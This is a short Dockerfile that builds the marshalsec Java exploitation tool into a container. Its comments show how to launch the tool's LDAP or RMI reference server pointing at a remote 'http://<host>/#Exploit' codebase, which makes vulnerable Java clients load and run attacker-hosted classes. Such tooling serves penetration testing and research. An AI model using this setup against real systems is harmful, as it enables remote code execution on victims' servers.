FROM maven:3.8.4-jdk-8-slim AS builder
COPY ./src /usr/src/marshalsec
COPY ./pom.xml /usr/src/marshalsec
WORKDIR /usr/src/marshalsec
RUN mvn clean package -DskipTests


FROM openjdk:8u181-jdk-alpine
EXPOSE 8080
RUN mkdir /app
COPY --from=builder /usr/src/marshalsec/target/marshalsec-*-SNAPSHOT-all.jar /app/marshalsec.jar
# Should be overwriten at run time
# CMD ["java", "-cp", "/app/marshalsec.jar", "marshalsec.jndi.LDAPRefServer", "http://<host>/#Exploit"]
# java -cp target/marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
